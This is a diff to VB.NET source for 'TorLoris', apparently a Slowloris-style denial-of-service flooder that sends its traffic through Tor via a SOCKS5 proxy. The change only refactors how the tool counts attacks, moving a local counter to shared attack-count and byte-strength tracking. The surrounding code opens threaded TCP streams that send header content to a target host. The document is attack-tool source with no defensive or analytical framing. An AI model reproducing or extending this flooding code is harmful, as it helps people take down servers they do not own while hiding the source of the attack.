@@ -14,7 +14,6 @@ Public Class TorLoris
     Private ThreadstoUse As Integer
     Private Threads As Thread()
     Private AttackRunning As Boolean = False
-    Private Attacks As Integer = 0
     Private RandomFile As Boolean
     Private proxyClient As Socks5ProxyClient
     Public Sub New(ByVal model As TorLorisModel)
@@ -52,8 +51,7 @@ Public Class TorLoris
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            GetFloodsBase().SetMessage("Torloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("Torloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
             GetFloodsBase().SetEnd()
         End If
 
@@ -68,8 +66,7 @@ Public Class TorLoris
                 End Try
             Next
             AttackRunning = False
-            GetFloodsBase().SetMessage("Torloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("Torloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
             HostToAttack = ""
 
         Else
@@ -123,8 +120,8 @@ Public Class TorLoris
                             stream.Flush()
                         End Using
 
-                        Attacks = Attacks + 1
-                        GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * headerContent.Length)
+                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * headerContent.Length)
 
                     Next i
                     Dim j As Integer
@@ -139,7 +136,7 @@ Public Class TorLoris
                             msg = msg + Convert.ToChar(reader.Read()).ToString
                         End While
 
-                        GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                         TCParray(i).Close()
 
                     Next j
